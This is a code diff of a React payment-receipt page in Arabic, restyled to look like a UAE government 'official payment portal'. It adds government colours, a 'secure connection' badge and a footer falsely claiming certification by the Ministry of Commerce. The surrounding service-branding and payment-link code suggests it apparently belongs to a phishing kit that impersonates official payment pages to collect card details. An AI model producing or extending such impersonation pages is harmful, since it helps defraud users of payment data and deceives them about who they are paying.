@@ -1,10 +1,11 @@
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
+import { Badge } from "@/components/ui/badge";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash } from "lucide-react";
+import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash, Shield, Lock as LockIcon } from "lucide-react";
 
 const PaymentReceiptPage = () => {
   const { id } = useParams();
@@ -34,7 +35,17 @@ const PaymentReceiptPage = () => {
   }
 
   const formattedAmount = `${amount} ر.س`;
-  
+
+  // UAE Government Color Scheme
+  const uaeColors = {
+    primary: "#CE1126",
+    secondary: "#00732F",
+    accent: "#000000",
+    background: "#FFFFFF",
+    lightGray: "#F5F5F5",
+    border: "#E0E0E0",
+  };
+
   const handleDownload = () => {
     // Create a simple receipt content
     const receiptContent = `
@@ -60,141 +71,178 @@ const PaymentReceiptPage = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="إيصال الدفع"
-      description={`تم الدفع بنجاح لخدمة ${serviceName}`}
-      icon={<CheckCircle className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-      showHero={false}
-    >
-      {/* Success Icon */}
-      <div className="text-center mb-6 sm:mb-8">
-        <div 
-          className="w-20 h-20 sm:w-24 sm:h-24 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg"
-          style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
-        >
-          <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 text-white" />
+    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
+      {/* Header */}
+      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
+        <div className="container mx-auto px-4 py-3">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-3">
+              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
+                <CheckCircle className="w-6 h-6" style={{ color: uaeColors.primary }} />
+              </div>
+              <div className="text-white">
+                <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
+                <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
+              </div>
+            </div>
+            <Badge variant="secondary" className="bg-white text-gray-800">
+              <LockIcon className="w-3 h-3 ml-1" />
+              اتصال آمن
+            </Badge>
+          </div>
         </div>
-        <h1 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: branding.colors.primary }}>
-          تم الدفع بنجاح!
-        </h1>
-        <p className="text-sm sm:text-base text-muted-foreground">
-          شكراً لك على استخدام خدمة {serviceName}
-        </p>
       </div>
 
-      {/* Receipt Details */}
-      <Card className="p-4 sm:p-6 mb-6" style={{ borderColor: branding.colors.primary }}>
-        <div className="space-y-4">
-          {/* Transaction ID */}
-          <div className="flex items-center justify-between py-2 border-b">
-            <div className="flex items-center gap-2">
-              <Hash className="w-4 h-4 text-muted-foreground" />
-              <span className="text-sm font-medium">رقم المعاملة</span>
+      <div className="container mx-auto px-4 py-8">
+        <div className="max-w-3xl mx-auto">
+          {/* Success Icon */}
+          <div className="text-center mb-6">
+            <div
+              className="w-24 h-24 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg"
+              style={{
+                background: `linear-gradient(135deg, ${uaeColors.secondary}, ${uaeColors.primary})`
+              }}
+            >
+              <CheckCircle className="w-12 h-12 text-white" />
             </div>
-            <span className="font-mono text-sm">{id}</span>
-          </div>
-          
-          {/* Date */}
-          <div className="flex items-center justify-between py-2 border-b">
-            <div className="flex items-center gap-2">
-              <Calendar className="w-4 h-4 text-muted-foreground" />
-              <span className="text-sm font-medium">التاريخ والوقت</span>
-            </div>
-            <span className="text-sm">{new Date().toLocaleString('ar-SA')}</span>
-          </div>
-          
-          {/* Service */}
-          <div className="flex items-center justify-between py-2 border-b">
-            <span className="text-sm font-medium">الخدمة</span>
-            <span className="text-sm font-semibold">{serviceName}</span>
-          </div>
-          
-          {/* Amount */}
-          <div className="flex items-center justify-between py-3">
-            <span className="text-lg font-bold">المبلغ المدفوع</span>
-            <span className="text-2xl font-bold" style={{ color: branding.colors.primary }}>
-              {formattedAmount}
-            </span>
-          </div>
-        </div>
-      </Card>
-
-      {/* Customer Info */}
-      <Card className="p-4 sm:p-6 mb-6">
-        <h3 className="font-semibold mb-4 text-sm sm:text-base">تفاصيل العميل</h3>
-        <div className="space-y-2 text-sm">
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">الاسم:</span>
-            <span>{customerInfo.name || 'غير محدد'}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">الهاتف:</span>
-            <span>{customerInfo.phone || 'غير محدد'}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">البريد الإلكتروني:</span>
-            <span>{customerInfo.email || 'غير محدد'}</span>
-          </div>
-          {customerInfo.address && (
-            <div className="flex justify-between">
-              <span className="text-muted-foreground">العنوان:</span>
-              <span className="text-right max-w-[200px]">{customerInfo.address}</span>
-            </div>
-          )}
-        </div>
-      </Card>
-
-      {/* Payment Method */}
-      <Card className="p-4 sm:p-6 mb-6">
-        <h3 className="font-semibold mb-4 text-sm sm:text-base">طريقة الدفع</h3>
-        <div className="flex items-center gap-3">
-          <CreditCard className="w-5 h-5" style={{ color: branding.colors.primary }} />
-          <div>
-            <p className="font-medium">بطاقة ائتمان</p>
-            <p className="text-sm text-muted-foreground">
-              **** **** **** {sessionStorage.getItem('cardLast4') || '****'}
+            <h1 className="text-3xl font-bold mb-2" style={{ color: uaeColors.secondary }}>
+              تم الدفع بنجاح!
+            </h1>
+            <p className="text-sm text-gray-600">
+              شكراً لك على استخدام خدمة {serviceName}
             </p>
           </div>
-        </div>
-      </Card>
 
-      {/* Action Buttons */}
-      <div className="space-y-3">
-        <Button
-          onClick={handleDownload}
-          variant="outline"
-          className="w-full"
-          style={{
-            borderColor: branding.colors.primary,
-            color: branding.colors.primary
-          }}
-        >
-          <Download className="w-4 h-4 ml-2" />
-          تحميل الإيصال
-        </Button>
-        
-        <Button
-          onClick={() => navigate('/')}
-          size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-          style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
-        >
-          <span className="ml-2">العودة للرئيسية</span>
-          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-        </Button>
+          <div className="bg-white rounded-lg shadow-lg border-0 overflow-hidden">
+            {/* Receipt Header */}
+            <div className="p-6 border-b" style={{ backgroundColor: uaeColors.lightGray }}>
+              <div className="text-center">
+                <h2 className="text-xl font-bold mb-2" style={{ color: uaeColors.accent }}>
+                  إيصال الدفع
+                </h2>
+                <p className="text-sm text-gray-600">رقم المعاملة: {id}</p>
+              </div>
+            </div>
+
+            {/* Receipt Details */}
+            <div className="p-6 space-y-4">
+              {/* Transaction ID */}
+              <div className="flex items-center justify-between py-3 border-b">
+                <div className="flex items-center gap-2">
+                  <Hash className="w-5 h-5 text-gray-500" />
+                  <span className="text-sm font-medium">رقم المعاملة</span>
+                </div>
+                <span className="font-mono text-sm" style={{ color: uaeColors.accent }}>{id}</span>
+              </div>
+
+              {/* Date */}
+              <div className="flex items-center justify-between py-3 border-b">
+                <div className="flex items-center gap-2">
+                  <Calendar className="w-5 h-5 text-gray-500" />
+                  <span className="text-sm font-medium">التاريخ والوقت</span>
+                </div>
+                <span className="text-sm">{new Date().toLocaleString('ar-SA')}</span>
+              </div>
+
+              {/* Service */}
+              <div className="flex items-center justify-between py-3 border-b">
+                <span className="text-sm font-medium">الخدمة</span>
+                <span className="text-sm font-semibold" style={{ color: uaeColors.accent }}>{serviceName}</span>
+              </div>
+
+              {/* Amount */}
+              <div className="flex items-center justify-between py-4 border-t-2" style={{ borderColor: uaeColors.primary }}>
+                <span className="text-lg font-bold" style={{ color: uaeColors.accent }}>المبلغ المدفوع</span>
+                <span className="text-3xl font-bold" style={{ color: uaeColors.primary }}>
+                  {formattedAmount}
+                </span>
+              </div>
+            </div>
+
+            {/* Customer Info */}
+            <div className="p-6 border-t" style={{ backgroundColor: uaeColors.lightGray }}>
+              <h3 className="font-semibold mb-4 text-base" style={{ color: uaeColors.accent }}>تفاصيل العميل</h3>
+              <div className="space-y-3 text-sm">
+                <div className="flex justify-between">
+                  <span className="text-gray-600">الاسم:</span>
+                  <span className="font-medium">{customerInfo.name || 'غير محدد'}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-gray-600">الهاتف:</span>
+                  <span className="font-medium">{customerInfo.phone || 'غير محدد'}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-gray-600">البريد الإلكتروني:</span>
+                  <span className="font-medium">{customerInfo.email || 'غير محدد'}</span>
+                </div>
+                {customerInfo.address && (
+                  <div className="flex justify-between">
+                    <span className="text-gray-600">العنوان:</span>
+                    <span className="text-right max-w-[200px] font-medium">{customerInfo.address}</span>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            {/* Payment Method */}
+            <div className="p-6">
+              <h3 className="font-semibold mb-4 text-base" style={{ color: uaeColors.accent }}>طريقة الدفع</h3>
+              <div className="flex items-center gap-3 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
+                <CreditCard className="w-6 h-6" style={{ color: uaeColors.primary }} />
+                <div>
+                  <p className="font-medium">بطاقة ائتمان</p>
+                  <p className="text-sm text-gray-600">
+                    **** **** **** {sessionStorage.getItem('cardLast4') || '****'}
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            {/* Action Buttons */}
+            <div className="p-6 bg-gray-50 border-t space-y-3">
+              <Button
+                onClick={handleDownload}
+                variant="outline"
+                className="w-full h-12"
+                style={{
+                  borderColor: uaeColors.primary,
+                  color: uaeColors.primary
+                }}
+              >
+                <Download className="w-5 h-5 ml-2" />
+                تحميل الإيصال
+              </Button>
+
+              <Button
+                onClick={() => navigate('/')}
+                size="lg"
+                className="w-full h-14 text-lg font-bold text-white transition-all hover:opacity-90"
+                style={{
+                  backgroundColor: uaeColors.primary
+                }}
+              >
+                <span className="ml-2">العودة للرئيسية</span>
+                <ArrowLeft className="w-5 h-5" />
+              </Button>
+            </div>
+          </div>
+
+          {/* Security Footer */}
+          <div className="mt-6 text-center">
+            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
+              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
+              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>
+                معتمد من وزارة التجارة
+              </span>
+            </div>
+          </div>
+
+          <p className="text-xs text-center text-gray-500 mt-6">
+            سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
+          </p>
+        </div>
       </div>
-      
-      <p className="text-xs text-center text-muted-foreground mt-6">
-        سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
-      </p>
-    </DynamicPaymentLayout>
+    </div>
   );
 };
 
